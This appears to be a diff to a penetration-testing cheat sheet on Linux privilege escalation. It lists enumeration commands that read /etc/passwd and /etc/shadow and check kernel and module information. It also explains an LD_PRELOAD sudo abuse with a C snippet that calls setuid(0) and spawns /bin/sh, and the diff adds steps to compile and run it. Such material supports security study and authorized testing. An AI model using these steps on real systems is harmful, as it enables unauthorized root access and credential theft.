@@ -13,17 +13,26 @@ whoami                             # enumerate the user
 id                                 # enumerate the user
 cat /etc/{passwd,shadow,group}     # check if we can see the stored passwords, users, groups
 cat /etc/{passwd,group}            # same but without shadow (usually 'Permission denied')
-ps aux, ps aux | grep root         # see unusual processes and processes run by the root user
+ps aux | grep --ignore-case root   # see unusual processes and processes run by the root user
 ```
 
 ## Further enumeration of the system, kernel version, errors..etc
 ```sh
 hostname
 hostname --all-{fqdns,ip-addresses}
-cat proc/{version,issue}
 uname --kernel-{name,release,version}
 uname --all
 lscpu
+
+cat /proc/{version,issue}
+cat /etc/os-release
+
+# for modules
+lsmod
+lsmod | cut -d ' ' -f 1 | sort --unique
+
+# oneliner: outputs errors(e.g the usual shadow permission denied) to file `err`
+cat {/proc/{version,issue},/etc/{passwd,shadow,group,os-release}} 2>err
 
 sudo -l                            # to check which commands I can run as a super user without the password
 ```
@@ -31,7 +40,16 @@ sudo -l                            # to check which commands I can run as a supe
 After executing `sudo -l` check the value of LD_PRELOAD, \
 if you see something like this: `env_keep += LD_PRELOAD` - Than you can use the following little `C src` to gain root access:
 
+### C Source code
+
+in.c
+
 ```c
+/*
+ * author: An00bis
+ * file: in.c
+ */
+
 #include <stdio.h>
 #include <sys/types.h>
 #include <stdlib.h>
@@ -42,6 +60,14 @@ setuid(0);
 system("/bin/sh");
 }
 ```
+
+### Compilation
+Usually, gcc is by default installed on most* systems.
+We can compile it with `gcc -o out.elf in.c`
+which takes `in.c` (our c source) 
+and outputs `out.elf` (a executable) \
+to run it: `./out.elf`
+
 
 # Network enumeration
 
